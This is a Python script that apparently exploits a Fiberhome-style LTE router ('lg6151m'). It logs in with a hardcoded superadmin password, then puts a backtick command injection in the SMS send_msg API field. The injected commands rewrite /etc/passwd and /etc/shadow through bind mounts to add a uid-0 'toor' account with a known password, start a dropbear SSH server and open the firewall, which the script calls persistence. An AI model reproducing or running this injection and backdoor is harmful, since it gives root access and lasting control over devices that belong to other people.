#!/usr/bin/env python3
"""Re-arm the SSH root channel after a reboot (zero-risk fallback persistence).
Sends ONE send_msg injection that rebuilds: /etc/passwd with toor, /etc/shadow
with MD5 hash, /etc/dropbear perms fix, dropbear host key, LAN firewall rule.
After this, SSH: toor / lg6151m-root-6151 @ port 22.
"""
import base64
import os
import json
import random
import sys

sys.path.insert(0, r"D:\Repo\lg6151m")
import login_and_read as L

TOOR_HASH = "$1$fhlg6151$ATwrqyUmHdLBTfkKhBmjA/"  # lg6151m-root-6151


def build_shadow_b64():
    shadow = open(r"D:\Repo\lg6151m\backup\sx1.txt").read().strip()
    shadow += f"\ntoor:{TOOR_HASH}:19953:0:99999:7:::\n"
    return base64.b64encode(shadow.encode()).decode()


def build_passwd_b64():
    passwd = open(r"D:\Repo\lg6151m\backup\px1.txt").read().strip()
    passwd += "\ntor:x:0:0:root:/tmp/h:/bin/ash\n".replace("tor:", "toor:")
    return base64.b64encode(passwd.encode()).decode()


def main():
    shadow_b64 = build_shadow_b64()
    passwd_b64 = build_passwd_b64()
    cmd = (
        "echo " + passwd_b64 + " | openssl base64 -d -A > /tmp/passwd; chmod 644 /tmp/passwd; "
        "mount --bind /tmp/passwd /etc/passwd; "
        "echo " + shadow_b64 + " | openssl base64 -d -A > /tmp/shadow; chmod 600 /tmp/shadow; "
        "mount --bind /tmp/shadow /etc/shadow; "
        "mkdir -p /tmp/dbd; chmod 755 /tmp/dbd; mount --bind /tmp/dbd /etc/dropbear; "
        "dropbearkey -t ed25519 -f /tmp/db_ed > /tmp/rearm.log 2>&1; "
        "/usr/sbin/dropbear -E -p 22 -r /tmp/db_ed >> /tmp/rearm.log 2>&1 & "
        "iptables -I INPUT 1 -p tcp -s 192.168.8.0/24 --dport 22 -j ACCEPT"
    )
    payload = "x`" + cmd + "`x"
    print(f"payload length: {len(payload)}")

    token, sid, key = L.get_token_sid_key()
    plain = json.dumps({"dataObj": {"username": "superadmin", "password": "F1ber$dm".replace("$", chr(36))},
                        "ajaxmethod": "DO_WEB_LOGIN", "sessionid": sid}, separators=(",", ":"))
    L.http("POST", f"/fh_api/sign/DO_WEB_LOGIN?_={random.random()}", L.encrypt_wire(plain, key).encode())
    token, sid, key = L.get_token_sid_key()
    body = json.dumps({"dataObj": {"recv_number": os.environ.get("LG_SMS_TO", "<phone-number>"), "encode_schema": "GSM_8BIT",
                                   "content": payload}, "ajaxmethod": "send_msg", "sessionid": sid},
                      separators=(",", ":"))
    st, resp = L.http("POST", f"/fh_api/tmp/FHAPIS?_={random.random()}",
                      L.encrypt_wire(body, key).encode(), timeout=60)
    print("send:", st, L.decrypt_wire(resp, key)[:80])
    print("wait ~10s, then: ssh toor@192.168.8.1  (password lg6151m-root-6151)")


if __name__ == "__main__":
    main()
